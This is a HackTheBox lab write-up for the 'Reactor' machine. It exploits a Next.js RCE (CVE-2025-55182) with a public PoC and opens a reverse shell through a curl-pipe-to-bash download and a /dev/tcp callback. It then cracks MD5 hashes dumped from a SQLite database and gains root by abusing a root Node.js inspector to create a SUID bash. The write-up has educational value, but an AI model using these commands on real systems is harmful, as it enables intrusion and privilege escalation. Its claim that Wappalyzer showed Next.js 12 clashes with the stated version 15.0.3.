## Synopsis

Reactor is an easy-difficulty Linux machine on HackTheBox hosting a **Next.js 15.0.3** web application ("ReactorWatch Core Monitoring System") on port 3000. Initial access is achieved by exploiting CVE-2025-55182 (known as "React2Shell"), an unauthenticated Remote Code Execution vulnerability affecting Next.js React Server Components, obtaining a shell as the `node` user. Filesystem enumeration reveals a SQLite database (`reactor.db`) containing MD5 password hashes. After cracking the `engineer` user's hash and logging in via SSH, privilege escalation is accomplished by abusing a **Node.js V8 Inspector** process running as root on localhost, accessed through SSH port forwarding and WebSocket communication to execute arbitrary JavaScript as root.

## Skills Required

- Web enumeration and HTTP header analysis
- CVE research and use of public exploits
- Basic hash cracking

## Skills Learned

- Exploiting unauthenticated RCE in Next.js via React Server Components (CVE-2025-55182)
- Extracting credentials from SQLite databases
- MD5 hash cracking
- SSH port forwarding to pivot to internal services
- Privilege escalation via Node.js V8 Inspector abuse (Chrome DevTools Protocol)

## Enumeration

We connect to our VPN and start enumerating with `nmap`.

```sh
sudo nmap -p- --open --min-rate 5000 -sS -Pn -sCV -n --disable-arp-ping --source-port 53 -oA target $ip
```

![Enumeraction Nmap](writeups/htb/src/reactor/Reactor_enumeration_nmap.png)

Nmap detects 2 open ports:

| Port | Service | Version                              | Notes                                                                                                                          |
| ---- | ------- | ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 9.6p1 (Ubuntu 3ubuntu13.16)   | Recent version, no publicly known vulnerabilities of interest for initial enumeration.                                          |
| 3000 | HTTP    | Next.js                               | Web application built with **Next.js** (`X-Powered-By: Next.js`). This will be the main target during the enumeration phase, since it exposes the web application. |

### Web application investigation

We open `http://reactor.htb:3000` in the browser and see a static home page.

![Main Page](writeups/htb/src/reactor/Reactor_main_page.png)

After analyzing the website, I didn't find any interesting functionality or obvious vulnerabilities. Since the application was built with `Next.js`, I wanted to identify the version being used. To do this, I used `Wappalyzer`, which showed that the site was running `Next.js` version 12. With this information, I searched for known vulnerabilities for that technology and found a public PoC for **[CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)**, so I decided to download it to check whether the application was vulnerable.

![Nextjs Version](writeups/htb/src/reactor/Reactor_next_version.png)

### Exploiting the CVE

Before using the exploit, I reviewed the script's available options to understand how it works and the correct way to run it. Then I ran a test to confirm it was working properly.

```sh
python CVE.py -h
python CVE.py -t http://reactor.htb:3000 -c 'id'
```

![Testing CVE](writeups/htb/src/reactor/Reactor_testing_CVE.png)

Once I confirmed the exploit was working correctly, all that remained was to use it to gain access to the server. Before running it, I set up a listener with `Penelope` to catch the reverse shell. I also hosted the payload on my machine, and the exploit made a `curl` request to download and execute it on the victim machine, thereby establishing the reverse connection.

```sh
echo "bash -i >& /dev/tcp/<MY_IP>/4444 0>&1" > rev.sh

python CVE.py -t http://reactor.htb:3000 -c 'curl http://<MY_IP>:8000/rev.sh|bash'
```

![Pwn One User](writeups/htb/src/reactor/Reactor_pwn_user.png)

## Lateral Movement

After gaining access to the server, I started the lateral movement phase. During enumeration I found a database at `/etc/reactor-app`, which contained interesting information for continuing the exploitation.

![Enum User](writeups/htb/src/reactor/Reactor_enumeration_user.png)

Seeing that it was a `.db` file, I figured it was a SQLite database. I checked that `sqlite3` was installed and proceeded to examine its content looking for interesting information that could help with exploitation.

```sh
which sqlite3
sqli2 reactor.db .dump
```

![Dump Database](writeups/htb/src/reactor/Reactor_dump_db.png)

| Username | Password                          |
| -------- | ---------------------------------- |
| admin    | a203b22191d744a4e70ada5c101b17b8   |
| engineer | 39d97110eafe2a9a68639812cd271e8e   |

### Cracking the hashes

After extracting the hashes from the database, I proceeded to try cracking them using `John the Ripper` and the `rockyou.txt` wordlist, with the goal of recovering the passwords associated with the users found in the application.

```sh
john --format=Raw-MD5 --wordlist=/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hashes.txt
```

![Cracking Hashes](writeups/htb/src/reactor/Reactor_crack_hashes.png)

```txt
user: engineer
password: reactor1
```

After obtaining the password, I verified its validity and proceeded to log in via *SSH*; the access was successful.

```sh
nxc $ip -u engineer -p reactor1
ssh engineer@reactor.htb
```

![SSH Conect](writeups/htb/src/reactor/Reactor_ssh_conect.png)

With valid credentials and SSH access, we could now read the user flag located in the compromised user's home directory.

![User Flag](writeups/htb/src/reactor/Reactor_user_flag.png)

## Privilege Escalation

Once I gained access as `engineer`, I started local enumeration looking for possible privilege escalation vectors. The first thing was to check the listening services; among the open ports, port *9229* caught my attention, since it was only listening on `127.0.0.1`. I checked the Node.js processes that were running:

```sh
ss -tunlp
ps aux | grep node
```

![Enum User Engineer](writeups/htb/src/reactor/Reactor_enum_user.png)

The output showed two processes. One corresponded to the `Next.js` application, and the other to the `uptime-monitor` service, which was running as **root** with the `--inspect` flag:

```sh
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

![Root Process](writeups/htb/src/reactor/Reactor_root_process.png)

The `--inspect` flag enables the Node.js debugger, allowing JavaScript code to be inspected and executed inside the process. Since it was running as `root`, any code sent to the inspector would inherit those same privileges. To confirm this, I connected to the service using the Node.js debugging client:

```sh
node inspect 127.0.0.1:9229
```

Once connected, I checked the user ID of the process and the answer was $0$.

```sh
exec("process.getuid()")
```

With this information, I took advantage of the service's insecure configuration to use the Node.js inspector itself to run a system command via the `child_process` module. This command created a copy of `bash` at `/tmp/r00t` and set the **SUID** bit on it, allowing any user to run that copy with the privileges of its owner (`root`).

```sh
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

![Service Insecure Config](writeups/htb/src/reactor/Reactor_exploit_node.png)

We then go into the `/tmp` folder and run `./r00t -p`, which gave me a shell as **root**, allowing me to read the flag located at `/root/root.txt` and complete the machine.

![Root Flag](writeups/htb/src/reactor/Reactor_root_flag.png)